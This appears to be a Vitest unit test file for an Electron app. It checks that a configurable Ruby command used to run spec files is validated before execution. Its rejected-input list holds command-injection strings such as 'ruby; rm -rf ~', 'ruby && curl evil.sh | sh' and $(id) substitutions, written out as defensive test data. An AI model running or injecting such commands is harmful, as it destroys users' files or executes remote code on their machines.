import { describe, it, expect, vi, beforeEach } from 'vitest'

const mockSafeExec = vi.hoisted(() => vi.fn())
vi.mock('electron', () => ({ BrowserWindow: class {} }))
vi.mock('../../src/main/utils/safeExec', () => ({ safeExec: mockSafeExec }))

import { runSpecFiles } from '../../src/main/handlers/testing/runSpecFiles'

beforeEach(() => {
  mockSafeExec.mockReset()
  mockSafeExec.mockResolvedValue({ stdout: '{}', stderr: '', exitCode: 0 })
})

describe('runSpecFiles ruby command', () => {
  it.each([
    'ruby',
    '/Users/me/.rbenv/shims/ruby',
    '~/.rbenv/shims/ruby',
    'eval "$(rbenv init -)" && rbenv shell 3.3.0 && ruby',
    'eval "$(rbenv init -)" && rbenv shell jruby-9.4.0.0 && ruby'
  ])('accepts %s', async (cmd) => {
    await runSpecFiles('/p', ['spec/a_spec.rb'], cmd)
    expect(mockSafeExec).toHaveBeenCalledTimes(1)
  })

  it.each([
    'ruby; rm -rf ~',
    'ruby && curl evil.sh | sh',
    'ruby $(id)',
    'ruby `id`',
    'ruby\ntouch x',
    'ruby > /tmp/x',
    "ruby 'x'",
    'eval "$(rbenv init -)" && rbenv shell 3.3.0; id && ruby',
    '',
    undefined,
    42
  ])('rejects %s without running anything', async (cmd) => {
    await expect(runSpecFiles('/p', ['spec/a_spec.rb'], cmd as never)).rejects.toThrow(
      /Ruby command/
    )
    expect(mockSafeExec).not.toHaveBeenCalled()
  })
})
